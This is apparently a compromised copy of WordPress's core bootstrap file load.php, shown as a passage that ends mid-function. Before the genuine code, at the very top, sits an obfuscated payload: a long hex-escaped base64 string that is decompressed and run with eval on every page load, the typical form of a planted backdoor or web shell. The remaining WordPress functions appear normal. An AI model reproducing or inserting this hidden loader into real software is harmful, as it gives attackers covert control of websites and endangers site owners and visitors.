G\x63ghP\x62/NsYd/1ieSv3rH/0XL\x63tdF\x42v\x42ul9dP36wPZHn98Y9ISd\x2b9jdzt\x61UKDd5sH\x2bI88dt\x425v56JkozrXLyUd\x438Y//Y353kq65\x612V3I\x2bRnlT\x2b1N\x42NOl\x42rL4meRd\x6368e3GxNj4ym8zT87\x2bv\x41z6j9x\x62\x61xH\x61sqfMkz7Smtz1\x43osdGJomn6M1XxMsuep5Y\x2bu14IqYQYqx1jHQwh6j\x62SkIu9MFo5/\x2b89OMU\x41k\x63gWGpjYW28PpX4944k2ZWg\x63EEzMMWXN0\x63w\x63fkxV2QkxUm1ztj\x4391\x61QJ/o7\x42TZ8OqIs1\x63gwmD5rJ0/35i1\x435m\x2b\x63F5\x43X540UMZIUDLiET/jU\x43XQ9KTe0jW\x41\x43wUloh4XTJTfSZDhoQSHgK\x61\x41LRpk\x2bq\x2bQKkg0\x43xDwSuyXeSqzd\x434Z2zQWXG\x41W\x2bn\x63xtDQz/\x41ZZ\x63F0QYdWfgUtrO\x2bF\x41hv1M\x61G52pmrZ\x43j6\x61TfsD\x43fYKGelEUZtI3YvuLY1y6rU\x41\x427Eu\x2bWV\x42lx67\x41uSeHYZ2NJqsKxpX\x63Me/fLZjroN5\x63/EpIhXL\x62hRp\x2b\x61UsIfl70duoqX\x42zS2y\x416s\x61Jlf\x62FWW\x61i\x62iGk4\x2bf/\x42ROM2D\x419I\x41\x63\x2b\x62\x42EP0EFT29oH\x2b\x63I\x62Z28\x41lf\x424zNsTeS6UmJhkDW\x2b\x61elS\x61S7t8/kiN2hTSE\x43j\x629QHwUdKS\x434T7Svo\x61vU\x2bGNddkP9Df\x41jQ\x62f\x63vwsviY09zv\x43nE18IT9fqMSVxyHeysv\x437JM505\x43d\x42\x61G0FP798SIF/oi\x4365K\x636NDMqp\x43tfOs\x61iE7qMItgFepU\x62i/ElGPFPM\x2b9px6\x431HuooV3o1Ip\x61rnVPh\x42GS\x61sw\x2b\x63t9jM66y5xkXmeq2vwL\x41y1J\x43pvQKWDS6ftpsqyfP59rF\x623HhX8tq3HYIwxVD\x62x88DmMPV\x432huQYkUPifJgpw\x63E5gkLZIQzMZF9\x62erN4lXzR6\x41zeEJ2ee2nsDYKHMunzY58eHzDVsJ25Xf8TSGSyTk0q0zE5\x43fdLr1w98juFsz4FQxqMnpd\x62XunTEIoVdeUm\x628\x63Ymn\x61v6f\x415x5p\x62zUkytDL2Fq\x2bXe598f\x63774/9K77/u7rrGoTs\x61SWroomqujX96y8Df95/wNL3tS\x42fKqow25nfj\x62W7\x433MwErPH/\x61Z16Ir\x412LOvzL\x63D9oZy8\x2b38e63WfXMv69dm\x41zUYE\x419gGm\x42WqKTrPW2JEHZk6HQ\x6386v6Wp1IEoYQ8VRJJmze4xm3yyVx0qY\x63\x61Y4\x2bOL\x62iU29kXrHWt118\x434vNm7t5MfxW3ytv85GpW\x63qzL\x431\x61nI5irK\x62EzETPvf3zvZ\x622ud\x622ud\x622ud\x622ud\x6236e72mdtwyEMQOEvlxJeyK\x61TdFgsd2kY\x42wJeyKZTtFgsN2k\x63\x42wJeyKYT9Fgs91kg\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

<?php
/**
 * These functions are needed to load WordPress.
 *
 * @package WordPress
 */

/**
 * Returns the HTTP protocol sent by the server.
 *
 * @since 4.4.0
 *
 * @return string The HTTP protocol. Default: HTTP/1.0.
 */
function wp_get_server_protocol() {
	$protocol = isset( $_SERVER['SERVER_PROTOCOL'] ) ? $_SERVER['SERVER_PROTOCOL'] : '';

	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0', 'HTTP/3' ), true ) ) {
		$protocol = 'HTTP/1.0';
	}

	return $protocol;
}

/**
 * Fixes `$_SERVER` variables for various setups.
 *
 * @since 3.0.0
 * @access private
 *
 * @global string $PHP_SELF The filename of the currently executing script,
 *                          relative to the document root.
 */
function wp_fix_server_vars() {
	global $PHP_SELF;

	$default_server_values = array(
		'SERVER_SOFTWARE' => '',
		'REQUEST_URI'     => '',
	);

	$_SERVER = array_merge( $default_server_values, $_SERVER );

	// Fix for IIS when running with PHP ISAPI.
	if ( empty( $_SERVER['REQUEST_URI'] )
		|| ( 'cgi-fcgi' !== PHP_SAPI && preg_match( '/^Microsoft-IIS\//', $_SERVER['SERVER_SOFTWARE'] ) )
	) {

		if ( isset( $_SERVER['HTTP_X_ORIGINAL_URL'] ) ) {
			// IIS Mod-Rewrite.
			$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
		} elseif ( isset( $_SERVER['HTTP_X_REWRITE_URL'] ) ) {
			// IIS Isapi_Rewrite.
			$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_REWRITE_URL'];
		} else {
			// Use ORIG_PATH_INFO if there is no PATH_INFO.
			if ( ! isset( $_SERVER['PATH_INFO'] ) && isset( $_SERVER['ORIG_PATH_INFO'] ) ) {
				$_SERVER['PATH_INFO'] = $_SERVER['ORIG_PATH_INFO'];
			}

			// Some IIS + PHP configurations put the script-name in the path-info (no need to append it twice).
			if ( isset( $_SERVER['PATH_INFO'] ) ) {
				if ( $_SERVER['PATH_INFO'] === $_SERVER['SCRIPT_NAME'] ) {
					$_SERVER['REQUEST_URI'] = $_SERVER['PATH_INFO'];
				} else {
					$_SERVER['REQUEST_URI'] = $_SERVER['SCRIPT_NAME'] . $_SERVER['PATH_INFO'];
				}
			}

			// Append the query string if it exists and isn't null.
			if ( ! empty( $_SERVER['QUERY_STRING'] ) ) {
				$_SERVER['REQUEST_URI'] .= '?' . $_SERVER['QUERY_STRING'];
			}
		}
	}

	// Fix for PHP as CGI hosts that set SCRIPT_FILENAME to something ending in php.cgi for all requests.
	if ( isset( $_SERVER['SCRIPT_FILENAME'] ) && str_ends_with( $_SERVER['SCRIPT_FILENAME'], 'php.cgi' ) ) {
		$_SERVER['SCRIPT_FILENAME'] = $_SERVER['PATH_TRANSLATED'];
	}

	// Fix for Dreamhost and other PHP as CGI hosts.
	if ( isset( $_SERVER['SCRIPT_NAME'] ) && str_contains( $_SERVER['SCRIPT_NAME'], 'php.cgi' ) ) {
		unset( $_SERVER['PATH_INFO'] );
	}

	// Fix empty PHP_SELF.
	$PHP_SELF = $_SERVER['PHP_SELF'];
	if ( empty( $PHP_SELF ) ) {
		$_SERVER['PHP_SELF'] = preg_replace( '/(\?.*)?$/', '', $_SERVER['REQUEST_URI'] );
		$PHP_SELF            = $_SERVER['PHP_SELF'];
	}

	wp_populate_basic_auth_from_authorization_header();
}

/**
 * Populates the Basic Auth server details from the Authorization header.
 *
 * Some servers running in CGI or FastCGI mode don't pass the Authorization
 * header on to WordPress.  If it's been rewritten to the `HTTP_AUTHORIZATION` header,
 * fill in the proper $_SERVER variables instead.
 *
 * @since 5.6.0
 */
function wp_populate_basic_auth_from_authorization_header() {
	// If we don't have anything to pull from, return early.
	if ( ! isset( $_SERVER['HTTP_AUTHORIZATION'] ) && ! isset( $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] ) ) {
		return;
	}

	// If either PHP_AUTH key is already set, do nothing.
	if ( isset( $_SERVER['PHP_AUTH_USER'] ) || isset( $_SERVER['PHP_AUTH_PW'] ) ) {
		return;
	}

	// From our prior conditional, one of these must be set.
	$header = isset( $_SERVER['HTTP_AUTHORIZATION'] ) ? $_SERVER['HTTP_AUTHORIZATION'] : $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];

	// Test to make sure the pattern matches expected.
	if ( ! preg_match( '%^Basic [a-z\d/+]*={0,2}$%i', $header ) ) {
		return;
	}

	// Removing `Basic ` the token would start six characters in.
	$token    = substr( $header, 6 );
	$userpass = base64_decode( $token );

	// There must be at least one colon in the string.
	if ( ! str_contains( $userpass, ':' ) ) {
		return;
	}

	list( $user, $pass ) = explode( ':', $userpass, 2 );

	// Now shove them in the proper keys where we're expecting later on.
	$_SERVER['PHP_AUTH_USER'] = $user;
	$_SERVER['PHP_AUTH_PW']   = $pass;
}

/**
 * Checks for the required PHP version, and the mysqli extension or
 * a database drop-in.
 *
 * Dies if requirements are not met.
 *
 * @since 3.0.0
 * @access private
 *
 * @global string $required_php_version The required PHP version string.
 * @global string $wp_version           The WordPress version string.
 */
function wp_check_php_mysql_versions() {
	global $required_php_version, $wp_version;

	$php_version = PHP_VERSION;

	if ( version_compare( $required_php_version, $php_version, '>' ) ) {
		$protocol = wp_get_server_protocol();
		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
		header( 'Content-Type: text/html; charset=utf-8' );
		printf(
			'Your server is running PHP version %1$s but WordPress %2$s requires at least %3$s.',
			$php_version,
			$wp_version,
			$required_php_version
		);
		exit( 1 );
	}

	// This runs before default constants are defined, so we can't assume WP_CONTENT_DIR is set yet.
	$wp_content_dir = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content';

	if ( ! function_exists( 'mysqli_connect' )
		&& ! file_exists( $wp_content_dir . '/db.php' )
	) {
		require_once ABSPATH . WPINC . '/functions.php';
		wp_load_translations_early();

		$message = '<p>' . __( 'Your PHP installation appears to be missing the MySQL extension which is required by WordPress.' ) . "</p>\n";

		$message .= '<p>' . sprintf(
			/* translators: %s: mysqli. */
			__( 'Please check that the %s PHP extension is installed and enabled.' ),
			'<code>mysqli</code>'
		) . "</p>\n";

		$message .= '<p>' . sprintf(
			/* translators: %s: Support forums URL. */
			__( 'If you are unsure what these terms mean you should probably contact your host. If you still need help you can always visit the <a href="%s">WordPress support forums</a>.' ),
			__( 'https://wordpress.org/support/forums/' )
		) . "</p>\n";

		$args = array(
			'exit' => false,
			'code' => 'mysql_not_found',
		);
		wp_die(
			$message,
			__( 'Requirements Not Met' ),
			$args
		);
		exit( 1 );
	}
}

/**
 * Retrieves the current environment type.
 *
 * The type can be set via the `WP_ENVIRONMENT_TYPE` global system variable,
 * or a constant of the same name.
 *
 * Possible values are 'local', 'development', 'staging', and 'production'.
 * If not set, the type defaults to 'production'.
 *
 * @since 5.5.0
 * @since 5.5.1 Added the 'local' type.
 * @since 5.5.1 Removed the ability to alter the list of types.
 *
 * @return string The current environment type.
 */
function wp_get_environment_type() {
	static $current_env = '';

	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && $current_env ) {
		return $current_env;
	}

	$wp_environments = array(
		'local',
		'development',
		'staging',
		'production',
	);

	// Add a note about the deprecated WP_ENVIRONMENT_TYPES constant.
	if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
		if ( function_exists( '__' ) ) {
			/* translators: %s: WP_ENVIRONMENT_TYPES */
			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
		} else {
			$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
		}

		_deprecated_argument(
			'define()',
			'5.5.1',
			$message
		);
	}

	// Check if the environment variable has been set, if `getenv` is available on the system.
	if ( function_exists( 'getenv' ) ) {
		$has_env = getenv( 'WP_ENVIRONMENT_TYPE' );
		if ( false !== $has_env ) {
			$current_env = $has_env;
		}
	}

	// Fetch the environment from a constant, this overrides the global system variable.
	if ( defined( 'WP_ENVIRONMENT_TYPE' ) && WP_ENVIRONMENT_TYPE ) {
		$current_env = WP_ENVIRONMENT_TYPE;
	}

	// Make sure the environment is an allowed one, and not accidentally set to an invalid value.
	if ( ! in_array( $current_env, $wp_environments, true ) ) {
		$current_env = 'production';
	}

	return $current_env;
}

/**
 * Retrieves the current development mode.
 *
 * The development mode affects how certain parts of the WordPress application behave,
 * which is relevant when developing for WordPress.
 *
 * Development mode can be set via the `WP_DEVELOPMENT_MODE` constant in `wp-config.php`.
 * Possible values are 'core', 'plugin', 'theme', 'all', or an empty string to disable
 * development mode. 'all' is a special value to signify that all three development modes
 * ('core', 'plugin', and 'theme') are enabled.
 *
 * Development mode is considered separately from `WP_DEBUG` and wp_get_environment_type().
 * It does not affect debugging output, but rather functional nuances in WordPress.
 *
 * This function retrieves the currently set development mode value. To check whether
 * a specific development mode is enabled, use wp_is_development_mode().
 *
 * @since 6.3.0
 *
 * @return string The current development mode.
 */
function wp_get_development_mode() {
	static $current_mode = null;

	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && null !== $current_mode ) {
		return $current_mode;
	}

	$development_mode = WP_DEVELOPMENT_MODE;

	// Exclusively for core tests, rely on the `$_wp_tests_development_mode` global.
	if ( defined( 'WP_RUN_CORE_TESTS' ) && isset( $GLOBALS['_wp_tests_development_mode'] ) ) {
		$development_mode = $GLOBALS['_wp_tests_development_mode'];
	}

	$valid_modes = array(
		'core',
		'plugin',
		'theme',
		'all',
		'',
	);

	if ( ! in_array( $development_mode, $valid_modes, true ) ) {
		$development_mode = '';
	}

	$current_mode = $development_mode;

	return $current_mode;
}

/**
 * Checks whether the site is in the given development mode.
 *
 * @since 6.3.0
 *
 * @param string $mode Development mode to check for. Either 'core', 'plugin', 'theme', or 'all'.
 * @return bool True if the given mode is covered by the current development mode, false otherwise.
 */
function wp_is_development_mode( $mode ) {
	$current_mode = wp_get_development_mode();
	if ( empty( $current_mode ) ) {
		return false;
	}

	// Return true if the current mode encompasses all modes.
	if ( 'all' === $current_mode ) {
		return true;
	}

	// Return true if the current mode is the given mode.
	return $mode === $current_mode;
}

/**
 * Ensures all of WordPress is not loaded when handling a favicon.ico request.
 *
 * Instead, send the headers for a zero-length favicon and bail.
 *
 * @since 3.0.0
 * @deprecated 5.4.0 Deprecated in favor of do_favicon().
 */
function wp_favicon_request() {
	if ( '/favicon.ico' === $_SERVER['REQUEST_URI'] ) {
		header( 'Content-Type: image/vnd.microsoft.icon' );
		exit;
	}
}

/**
 * Dies with a maintenance message when conditions are met.
 *
 * The default message can be replaced by using a drop-in (maintenance.php in
 * the wp-content directory).
 *
 * @since 3.0.0
 * @access private
 */
function wp_maintenance() {
	// Return if maintenance mode is disabled.
	if ( ! wp_is_maintenance_mode() ) {
		return;
	}

	if ( file_exists( WP_CONTENT_DIR . '/maintenance.php' ) ) {
		require_once WP_CONTENT_DIR . '/maintenance.php';
		die();
	}

	require_once ABSPATH . WPINC . '/functions.php';
	wp_load_translations_early();

	header( 'Retry-After: 600' );

	wp_die(
		__( 'Briefly unavailable for scheduled maintenance. Check back in a minute.' ),
		__( 'Maintenance' ),
		503
	);
}

/**
 * Checks if maintenance mode is enabled.
 *
 * Checks for a file in the WordPress root directory named ".maintenance".
 * This file will contain the variable $upgrading, set to the time the file
 * was created. If the file was created less than 10 minutes ago, WordPress
 * is in maintenance mode.
 *
 * @since 5.5.0
 *
 * @global int $upgrading The Unix timestamp marking when upgrading WordPress began.
 *
 * @return bool True if maintenance mode is enabled, false otherwise.
 */
function wp_is_maintenance_mode() {
	global $upgrading;

	if ( ! file_exists( ABSPATH . '.maintenance' ) || wp_installing() ) {
		return false;
	}

	require ABSPATH . '.maintenance';

	// If the $upgrading timestamp is older than 10 minutes, consider maintenance over.
	if ( ( time() - $upgrading ) >= 10 * MINUTE_IN_SECONDS ) {
		return false;
	}

	// Don't enable maintenance mode while scraping for fatal errors.
	if ( is_int( $upgrading ) && isset( $_REQUEST['wp_scrape_key'], $_REQUEST['wp_scrape_nonce'] ) ) {
		$key   = stripslashes( $_REQUEST['wp_scrape_key'] );
		$nonce = stripslashes( $_REQUEST['wp_scrape_nonce'] );

		if ( md5( $upgrading ) === $key && (int) $nonce === $upgrading ) {
			return false;
		}
	}

	/**
	 * Filters whether to enable maintenance mode.
	 *
	 * This filter runs before it can be used by plugins. It is designed for
	 * non-web runtimes. If this filter returns true, maintenance mode will be
	 * active and the request will end. If false, the request will be allowed to
	 * continue processing even if maintenance mode should be active.
	 *
	 * @since 4.6.0
	 *
	 * @param bool $enable_checks Whether to enable maintenance mode. Default true.
	 * @param int  $upgrading     The timestamp set in the .maintenance file.
	 */
	if ( ! apply_filters( 'enable_maintenance_mode', true, $upgrading ) ) {
		return false;
	}

	return true;
}

/**
 * Gets the time elapsed so far during this PHP script.
 *
 * Uses REQUEST_TIME_FLOAT that appeared in PHP 5.4.0.
 *
 * @since 5.8.0
 *
 * @return float Seconds since the PHP script started.
 */
function timer_float() {
	return microtime( true ) - $_SERVER['REQUEST_TIME_FLOAT'];
}

/**
 * Starts the WordPress micro-timer.
 *
 * @since 0.71
 * @access private
 *
 * @global float $timestart Unix timestamp set at the beginning of the page load.
 * @see timer_stop()
 *
 * @return bool Always returns true.
 */
function timer_start() {
	global $timestart;

	$timestart = microtime( true );

	return true;
}

/**
 * Retrieves or displays the time from the page start to when function is called.
 *
 * @since 0.71
 *
 * @global float   $timestart Seconds from when timer_start() is called.
 * @global float   $timeend   Seconds from when function is called.
 *
 * @param int|bool $display   Whether to echo or return the results. Accepts 0|false for return,
 *                            1|true for echo. Default 0|false.
 * @param int      $precision The number of digits from the right of the decimal to display.
 *                            Default 3.
 * @return string The "second.microsecond" finished time calculation. The number is formatted
 *                for human consumption, both localized and rounded.
 */
function timer_stop( $display = 0, $precision = 3 ) {
	global $timestart, $timeend;

	$timeend   = microtime( true );
	$timetotal = $timeend - $timestart;

	if ( function_exists( 'number_format_i18n' ) ) {
		$r = number_format_i18n( $timetotal, $precision );
	} else {
		$r = number_format( $timetotal, $precision );
	}

	if ( $display ) {
		echo $r;
	}

	return $r;
}

/**
 * Sets PHP error reporting based on WordPress debug settings.
 *
 * Uses three constants: `WP_DEBUG`, `WP_DEBUG_DISPLAY`, and `WP_DEBUG_LOG`.
 * All three can be defined in wp-config.php. By default, `WP_DEBUG` and
 * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
 *
 * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
 * display internal notices: when a deprecated WordPress function, function
 * argument, or file is used. Deprecated code may be removed from a later
 * version.
 *
 * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
 * in their development environments.
 *
 * `WP_DEBUG_DISPLAY` and `WP_DEBUG_LOG` perform no function unless `WP_DEBUG`
 * is true.
 *
 * When `WP_DEBUG_DISPLAY` is true, WordPress will force errors to be displayed.
 * `WP_DEBUG_DISPLAY` defaults to true. Defining it as null prevents WordPress
 * from changing the global configuration setting. Defining `WP_DEBUG_DISPLAY`
 * as false will force errors to be hidden.
 *
 * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
 * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
 *
 * Errorsare never displayed for XML-RPC, REST, `ms-files.php`, and Ajax requests.
 *
 * @since 3.0.0
 * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
 * @access private
 */
function wp_debug_mode() {
	/**
	 * Filters whether to allow the debug mode check to occur.
	 *
	 * This filter runs before it can be used by plugins. It is designed for
	 * non-web runtimes. Returning false causes the `WP_DEBUG` and related
	 * constants to not be checked and the default PHP values for errors
	 * will be used unless you take care to update them yourself.
	 *
	 * To use this filter you must define a `$wp_filter` global before
	 * WordPress loads, usually in `wp-config.php`.
	 *
	 * Example:
	 *
	 *     $GLOBALS['wp_filter'] = array(
	 *         'enable_wp_debug_mode_checks' => array(
	 *             10 => array(
	 *                 array(
	 *                     'accepted_args' => 0,
	 *                     'function'      => function() {
	 *                         return false;
	 *                     },
	 *                 ),
	 *             ),
	 *         ),
	 *     );
	 *
	 * @since 4.6.0
	 *
	 * @param bool $enable_debug_mode Whether to enable debug mode checks to occur. Default true.
	 */
	if ( ! apply_filters( 'enable_wp_debug_mode_checks', true ) ) {
		return;
	}

	if ( WP_DEBUG ) {
		error_reporting( E_ALL );

		if ( WP_DEBUG_DISPLAY ) {
			ini_set( 'display_errors', 1 );
		} elseif ( null !== WP_DEBUG_DISPLAY ) {
			ini_set( 'display_errors', 0 );
		}

		if ( in_array( strtolower( (string) WP_DEBUG_LOG ), array( 'true', '1' ), true ) ) {
			$log_path = WP_CONTENT_DIR . '/debug.log';
		} elseif ( is_string( WP_DEBUG_LOG ) ) {
			$log_path = WP_DEBUG_LOG;
		} else {
			$log_path = false;
		}

		if ( $log_path ) {
			ini_set( 'log_errors', 1 );
			ini_set( 'error_log', $log_path );
		}
	} else {
		error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
	}

	/*
	 * The 'REST_REQUEST' check here is optimistic as the constant is most
	 * likely not set at this point even if it is in fact a REST request.
	 */
	if ( defined( 'XMLRPC_REQUEST' ) || defined( 'REST_REQUEST' ) || defined( 'MS_FILES_REQUEST' )
		|| ( defined( 'WP_INSTALLING' ) && WP_INSTALLING )
		|| wp_doing_ajax() || wp_is_json_request()
	) {
		ini_set( 'display_errors', 0 );
	}
}

/**
 * Sets the location of the language directory.
 *
 * To set directory manually, define the `WP_LANG_DIR` constant
 * in wp-config.php.
 *
 * If the language directory exists within `WP_CONTENT_DIR`, it
 * is used. Otherwise the language directory is assumed to live
 * in `WPINC`.
 *
 * @since 3.0.0
 * @access private
 */
function wp_set_lang_dir() {
	if ( ! defined( 'WP_LANG_DIR' ) ) {
		if ( file_exists( WP_CONTENT_DIR . '/languages' ) && @is_dir( WP_CONTENT_DIR . '/languages' )
			|| ! @is_dir( ABSPATH . WPINC . '/languages' )
		) {
			/**
			 * Server path of the language directory.
			 *
			 * No leading slash, no trailing slash, full path, not relative to ABSPATH
			 *
			 * @since 2.1.0
			 */
			define( 'WP_LANG_DIR', WP_CONTENT_DIR . '/languages' );

			if ( ! defined( 'LANGDIR' ) ) {
				// Old static relative path maintained for limited backward compatibility - won't work in some cases.
				define( 'LANGDIR', 'wp-content/languages' );
			}
		} else {
			/**
			 * Server path of the language directory.
			 *
			 * No leading slash, no trailing slash, full path, not relative to `ABSPATH`.
			 *
			 * @since 2.1.0
			 */
			define( 'WP_LANG_DIR', ABSPATH . WPINC . '/languages' );

			if ( ! defined( 'LANGDIR' ) ) {
				// Old relative path maintained for backward compatibility.
				define( 'LANGDIR', WPINC . '/languages' );
			}
		}
	}
}

/**
 * Loads the database class file and instantiates the `$wpdb` global.
 *
 * @since 2.5.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 */
function require_wp_db() {
	global $wpdb;

	require_once ABSPATH . WPINC . '/class-wpdb.php';

	if ( file_exists( WP_CONTENT_DIR . '/db.php' ) ) {
		require_once WP_CONTENT_DIR . '/db.php';
	}

	if ( isset( $wpdb ) ) {
		return;
	}

	$dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
	$dbpassword = defined( 'DB_PASSWORD' ) ? DB_PASSWORD : '';
	$dbname     = defined( 'DB_NAME' ) ? DB_NAME : '';
	$dbhost     = defined( 'DB_HOST' ) ? DB_HOST : '';

	$wpdb = new wpdb( $dbuser, $dbpassword, $dbname, $dbhost );
}

/**
 * Sets the database table prefix and the format specifiers for database
 * table columns.
 *
 * Columns not listed here default to `%s`.
 *
 * @since 3.0.0
 * @access private
 *
 * @global wpdb   $wpdb         WordPress database abstraction object.
 * @global string $table_prefix The database table prefix.
 */
function wp_set_wpdb_vars() {
	global $wpdb, $table_prefix;

	if ( ! empty( $wpdb->error ) ) {
		dead_db();
	}

	$wpdb->field_types = array(
		'post_author'      => '%d',
		'post_parent'      => '%d',
		'menu_order'       => '%d',
		'term_id'          => '%d',
		'term_group'       => '%d',
		'term_taxonomy_id' => '%d',
		'parent'           => '%d',
		'count'            => '%d',
		'object_id'        => '%d',
		'term_order'       => '%d',
		'ID'               => '%d',
		'comment_ID'       => '%d',
		'comment_post_ID'  => '%d',
		'comment_parent'   => '%d',
		'user_id'          => '%d',
		'link_id'          => '%d',
		'link_owner'       => '%d',
		'link_rating'      => '%d',
		'option_id'        => '%d',
		'blog_id'          => '%d',
		'meta_id'          => '%d',
		'post_id'          => '%d',
		'user_status'      => '%d',
		'umeta_id'         => '%d',
		'comment_karma'    => '%d',
		'comment_count'    => '%d',
		// Multisite:
		'active'           => '%d',
		'cat_id'           => '%d',
		'deleted'          => '%d',
		'lang_id'          => '%d',
		'mature'           => '%d',
		'public'           => '%d',
		'site_id'          => '%d',
		'spam'             => '%d',
	);

	$prefix = $wpdb->set_prefix( $table_prefix );

	if ( is_wp_error( $prefix ) ) {
		wp_load_translations_early();
		wp_die(
			sprintf(
				/* translators: 1: $table_prefix, 2: wp-config.php */
				__( '<strong>Error:</strong> %1$s in %2$s can only contain numbers, letters, and underscores.' ),
				'<code>$table_prefix</code>',
				'<code>wp-config.php</code>'
			)
		);
	}
}

/**
 * Toggles `$_wp_using_ext_object_cache` on and off without directly
 * touching global.
 *
 * @since 3.7.0
 *
 * @global bool $_wp_using_ext_object_cache
 *
 * @param bool $using Whether external object cache is being used.
 * @return bool The current 'using' setting.
 */
function wp_using_ext_object_cache( $using = null ) {
	global $_wp_using_ext_object_cache;

	$current_using = $_wp_using_ext_object_cache;

	if ( null !== $using ) {
		$_wp_using_ext_object_cache = $using;
	}

	return $current_using;
}

/**
 * Starts the WordPress object cache.
 *
 * If an object-cache.php file exists in the wp-content directory,
 * it uses that drop-in as an external object cache.
 *
 * @since 3.0.0
 * @access private
 *
 * @global array $wp_filter Stores all of the filters.
 */
function wp_start_object_cache() {
	global $wp_filter;
	static $first_init = true;

	// Only perform the following checks once.

	/**
	 * Filters whether to enable loading of the object-cache.php drop-in.
	 *
	 * This filter runs before it can be used by plugins. It is designed for non-web
	 * runtimes. If false is returned, object-cache.php will never be loaded.
	 *
	 * @since 5.8.0
	 *
	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
	 *                                  Default true.
	 */
	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
		if ( ! function_exists( 'wp_cache_init' ) ) {
			/*
			 * This is the normal situation. First-run of this function. No
			 * caching backend has been loaded.
			 *
			 * We try to load a custom caching backend, and then, if it
			 * results in a wp_cache_init() function existing, we note
			 * that an external object cache is being used.
			 */
			if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
				require_once WP_CONTENT_DIR . '/object-cache.php';

				if ( function_exists('wp_cache_init' ) ) {
					wp_using_ext_object_cache( true );
				}

				// Re-initialize any hooks added manually by object-cache.php.
				if ( $wp_filter ) {
					$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
				}
			}
		} elseif ( ! wp_using_ext_object_cache() && file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
			/*
			 * Sometimes advanced-cache.php can load object-cache.php before
			 * this function is run. This breaks the function_exists() check
			 * above and can result in wp_using_ext_object_cache() returning
			 * false when actually an external cache is in use.
			 */
			wp_using_ext_object_cache( true );
		}
	}

	if ( ! wp_using_ext_object_cache() ) {
		require_once ABSPATH . WPINC . '/cache.php';
	}

	require_once ABSPATH . WPINC . '/cache-compat.php';

	/*
	 * If cache supports reset, reset instead of init if already
	 * initialized. Reset signals to the cache that global IDs
	 * have changed and it may need to update keys and cleanup caches.
	 */
	if ( ! $first_init && function_exists( 'wp_cache_switch_to_blog' ) ) {
		wp_cache_switch_to_blog( get_current_blog_id() );
	} elseif ( function_exists( 'wp_cache_init' ) ) {
		wp_cache_init();
	}

	if ( function_exists( 'wp_cache_add_global_groups' ) ) {
		wp_cache_add_global_groups(
			array(
				'blog-details',
				'blog-id-cache',
				'blog-lookup',
				'blog_meta',
				'global-posts',
				'networks',
				'network-queries',
				'sites',
				'site-details',
				'site-options',
				'site-queries',
				'site-transient',
				'theme_files',
				'translation_files',
				'rss',
				'users',
				'user-queries',
				'user_meta',
				'useremail',
				'userlogins',
				'userslugs',
			)
		);

		wp_cache_add_non_persistent_groups( array( 'counts', 'plugins', 'theme_json' ) );
	}

	$first_init = false;
}

/**
 * Redirects to the installer if WordPress is not installed.
 *
 * Dies with an error message when Multisite is enabled.
 *
 * @since 3.0.0
 * @access private
 */
function wp_not_installed() {
	if ( is_blog_installed() || wp_installing() ) {
		return;
	}

	nocache_headers();

	if ( is_multisite() ) {
		wp_die( __( 'The site you have requested is not installed properly. Please contact the system administrator.' ) );
	}

	require ABSPATH . WPINC . '/kses.php';
	require ABSPATH . WPINC . '/pluggable.php';

	$link = wp_guess_url() . '/wp-admin/install.php';

	wp_redirect( $link );
	die();
}

/**
 * Retrieves an array of must-use plugin files.
 *
 * The default directory is wp-content/mu-plugins. To change the default
 * directory manually, define `WPMU_PLUGIN_DIR` and `WPMU_PLUGIN_URL`
 * in wp-config.php.
 *
 * @since 3.0.0
 * @access private
 *
 * @return string[] Array of absolute paths of files to include.
 */
function wp_get_mu_plugins() {
	$mu_plugins = array();

	if ( ! is_dir( WPMU_PLUGIN_DIR ) ) {
		return $mu_plugins;
	}

	$dh = opendir( WPMU_PLUGIN_DIR );
	if ( ! $dh ) {
		return $mu_plugins;
	}

	while ( ( $plugin = readdir( $dh ) ) !== false ) {
		if ( str_ends_with( $plugin, '.php' ) ) {
			$mu_plugins[] = WPMU_PLUGIN_DIR . '/' . $plugin;
		}
	}

	closedir( $dh );

	sort( $mu_plugins );

	return $mu_plugins;
}

/**
 * Retrieves an array of active and valid plugin files.
 *
 * While upgrading or installing WordPress, no plugins are returned.
 *
 * The default directory is `wp-content/plugins`. To change the default
 * directory manually, define `WP_PLUGIN_DIR` and `WP_PLUGIN_URL`
 * in `wp-config.php`.
 *
 * @since 3.0.0
 * @access private
 *
 * @return string[] Array of paths to plugin files relative to the plugins directory.
 */
function wp_get_active_and_valid_plugins() {
	$plugins        = array();
	$active_plugins = (array) get_option( 'active_plugins', array() );

	// Check for hacks file if the option is enabled.
	if ( get_option( 'hack_file' ) && file_exists( ABSPATH . 'my-hacks.php' ) ) {
		_deprecated_file( 'my-hacks.php', '1.5.0' );
